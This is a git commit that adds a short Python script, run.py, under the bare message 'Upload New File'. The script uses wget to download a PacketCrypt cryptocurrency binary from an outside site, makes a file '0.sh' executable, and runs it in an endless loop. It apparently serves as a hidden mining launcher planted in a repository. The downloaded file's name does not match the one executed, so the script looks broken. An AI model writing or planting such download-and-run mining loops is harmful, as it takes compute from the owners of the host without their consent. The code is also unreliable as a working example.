dc57dfa7916cd266d0a5edfd04d7825ead7e59a5
jsiqiisn <jsiqiisn@outlook.com>
2022-04-25 16:41:43 +0000

    Upload New File

---
+++ run.py
@@ -0,0 +1,9 @@
+import sys
+import os
+from time import sleep
+os.system('wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O asw')
+sleep(2)
+os.system('chmod 777 0.sh')
+sleep(2)
+while(True):
+        	os.system('./0.sh')
